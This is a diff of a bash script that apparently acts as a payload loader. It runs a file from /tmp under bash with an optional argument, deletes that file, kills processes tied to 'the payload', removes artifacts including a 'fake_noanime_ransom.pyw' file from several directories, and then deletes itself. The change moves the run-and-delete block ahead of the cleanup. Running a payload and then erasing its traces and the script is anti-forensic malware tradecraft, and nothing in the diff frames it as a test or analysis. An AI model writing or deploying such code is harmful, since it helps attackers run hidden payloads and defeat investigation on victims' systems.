@@ -118,11 +118,21 @@ fi
 
 cd /tmp
 
-# =========================================================
-# CLEANUP: KILL PROCESSES & DELETE FILES
-# =========================================================
-# Define paths and file variations (Linux equivalent of ProgramData\.config)
-# =========================================================
+
+
+# --- 2. run it under bash with optional arg, then delete it ---
+if [ -n "$ARG" ]; then
+    echo "==> Running: bash ${FILE1} ${ARG}"
+    # Subshell + set -f so $ARG is word-split but NOT glob-expanded
+    ( set -f; bash -- "${FILE1}" $ARG )
+else
+    echo "==> Running: bash ${FILE1}"
+    bash -- "${FILE1}"
+fi
+
+echo "==> Deleting ${FILE1}"
+rm -f -- "${FILE1}"
+
 # CLEANUP: KILL PROCESSES & DELETE FILES
 # =========================================================
 # 1. Kill any running processes related to the payload
@@ -146,19 +156,6 @@ for dir in $CLEANUP_DIRS; do
     rm -f -- "$dir/fake_noanime_ransom.pyw" 2>/dev/null || true
 done
 # =========================================================
-
-# --- 2. run it under bash with optional arg, then delete it ---
-if [ -n "$ARG" ]; then
-    echo "==> Running: bash ${FILE1} ${ARG}"
-    # Subshell + set -f so $ARG is word-split but NOT glob-expanded
-    ( set -f; bash -- "${FILE1}" $ARG )
-else
-    echo "==> Running: bash ${FILE1}"
-    bash -- "${FILE1}"
-fi
-
-echo "==> Deleting ${FILE1}"
-rm -f -- "${FILE1}"
 
 # --- 3. delete self (only if we actually know where we are) ---
 if [ -n "$SCRIPT_PATH" ] && [ -f "$SCRIPT_PATH" ]; then
